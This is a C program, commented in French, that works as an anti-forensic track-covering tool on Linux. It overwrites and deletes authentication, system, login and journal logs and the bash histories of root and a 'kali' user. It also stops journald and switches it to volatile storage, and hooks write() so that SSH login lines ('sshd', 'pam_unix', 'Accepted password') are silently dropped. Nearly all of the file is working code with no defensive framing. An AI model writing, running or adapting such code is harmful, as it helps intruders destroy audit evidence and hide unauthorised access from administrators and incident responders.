#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dlfcn.h>

// Liste des fichiers logs à supprimer
const char *log_files[] = {
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/kern.log",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/log/lastlog",
    "/var/log/journal/",
    "/run/log/journal/",
    "/root/.bash_history",
    "/home/kali/.bash_history",
    NULL
};

// Écrase un fichier avant suppression (anti-forensic)
void wipe_file(const char *filepath) {
    int fd = open(filepath, O_WRONLY);
    if (fd >= 0) {
        struct stat st;
        fstat(fd, &st);
        size_t file_size = st.st_size;

        char *buffer = malloc(file_size);
        if (buffer) {
            memset(buffer, rand() % 256, file_size);
            write(fd, buffer, file_size);
            free(buffer);
        }
        close(fd);
    }
}

// Supprime un fichier proprement
void remove_log(const char *filepath) {
    wipe_file(filepath);
    remove(filepath);
}

// Désactive et vide journalctl
void clear_journalctl_logs() {
    system("systemctl stop systemd-journald");
    system("systemctl stop systemd-journal-flush.service");
    system("journalctl --vacuum-time=1s");
    system("journalctl --flush");
    system("journalctl --rotate");
    system("rm -rf /var/log/journal/*");
    system("rm -rf /run/log/journal/*");
    system("mkdir -p /etc/systemd/journald.conf.d");
    system("echo -e '[Journal]\\nStorage=volatile' > /etc/systemd/journald.conf.d/disable.conf");
    system("systemctl restart systemd-journald");
}

// Efface les logs
void clear_logs() {
    for (int i = 0; log_files[i] != NULL; i++) {
        remove_log(log_files[i]);
    }
}

// Hook sur write() pour empêcher l’écriture des logs SSH
typedef ssize_t (*orig_write_t)(int, const void *, size_t);
static orig_write_t orig_write = NULL;

ssize_t write(int fd, const void *buf, size_t count) {
    if (!orig_write) {
        orig_write = (orig_write_t)dlsym(RTLD_NEXT, "write");
    }

    // Bloque l'écriture des logs SSH
    if (strstr(buf, "sshd") || strstr(buf, "pam_unix") || strstr(buf, "Accepted password")) {
        return count; // On bloque le log en simulant l'écriture
    }

    return orig_write(fd, buf, count);
}

// Programme principal
int main() {
    printf("[INFO] Suppression des logs systemd et SSH...\n");
    clear_logs();
    clear_journalctl_logs();
    printf("[INFO] Tous les logs sont supprimés !\n");
    return 0;
}
